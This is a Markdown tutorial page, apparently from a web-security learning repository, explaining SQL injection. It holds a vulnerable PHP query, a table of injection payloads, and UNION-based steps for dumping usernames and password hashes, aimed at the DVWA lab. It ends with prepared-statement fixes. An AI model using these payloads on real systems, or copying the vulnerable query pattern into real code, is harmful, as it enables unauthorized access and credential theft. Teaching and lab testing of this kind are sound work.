# SQL Injection (SQLi)

SQL Injection is a web vulnerability where attacker-controlled input is inserted into SQL queries, allowing manipulation of database operations.

---

## How SQL Injection Works

### Vulnerable Code Example

```php
$query = "SELECT * FROM users WHERE user = '$username' AND password = '$password'";
$result = mysqli_query($conn, $query);
```

If input is not sanitized, an attacker can alter the query logic.

### Authentication Bypass

**Payload:**
```
Username: admin' --
Password: anything
```

**Resulting query:**
```sql
SELECT * FROM users WHERE user = 'admin' --' AND password = 'anything'
```

The `--` comments out the password check, granting access without a valid password.

---

## Common SQLi Payloads

| Payload | Purpose |
|---------|---------|
| `' OR '1'='1` | Bypass authentication |
| `' OR '1'='1' --` | Bypass with comment |
| `' UNION SELECT null, username, password FROM users --` | Extract credentials |
| `1' ORDER BY 1 --` | Column enumeration |
| `' AND 1=1 --` | Boolean-based blind SQLi |
| `' AND SLEEP(5) --` | Time-based blind SQLi |

---

## UNION-Based Data Extraction

### Step 1: Find number of columns

```
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --
```

Stop when an error occurs — that reveals the column count.

### Step 2: Extract data

```
' UNION SELECT 1, user, password FROM users --
```

### Step 3: Dump all credentials

```
' UNION SELECT 1, group_concat(user, ':', password), 3 FROM users --
```

**Example output:**
```
admin:21232f297a57a5a743894a0e4a801fc3
gordonb:e99a18c428cb38d5f260853678922e03
```

---

## SQLi Types

| Type | Description | Detection |
|------|-------------|-----------|
| In-band | Results returned directly in response | UNION SELECT |
| Blind Boolean | True/false responses differ | `' AND 1=1` vs `' AND 1=2` |
| Blind Time | Delayed responses indicate truth | `' AND SLEEP(5) --` |
| Error-based | Database errors reveal structure | `' AND extractvalue(...)` |
| Out-of-band | Data exfiltrated via DNS/HTTP | DNS lookup payloads |

---

## Testing on DVWA

DVWA provides a SQL Injection module with security levels (Low, Medium, High, Impossible).

```bash
# Access DVWA SQL Injection page
http://localhost/DVWA/vulnerabilities/sqli/
```

| Security Level | Difficulty | Technique |
|----------------|------------|-----------|
| Low | Direct injection in URL parameter | `' OR '1'='1` |
| Medium | POST-based, some filtering | Encoding bypass |
| High | LIMIT 1 added to query | SQLi with LIMIT bypass |
| Impossible | Prepared statements | Not exploitable |

---

## Prevention: Prepared Statements

### Vulnerable (PHP)

```php
$query = "SELECT * FROM users WHERE user = '$username'";
```

### Secure (PHP with prepared statements)

```php
$stmt = $conn->prepare("SELECT * FROM users WHERE user = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
```

### Secure (Python)

```python
cursor.execute("SELECT * FROM users WHERE user = %s AND password = %s", (username, password))
```

---

## Additional Mitigations

- **Input validation** — whitelist allowed characters
- **Least privilege** — database user should have minimal permissions
- **WAF** — Web Application Firewall to filter malicious input
- **Error handling** — never expose database errors to users
- **ORM frameworks** — use parameterized queries by default

See [scenarios/sqli-attack-mitigation.md](../scenarios/sqli-attack-mitigation.md) for a complete attack and fix scenario.
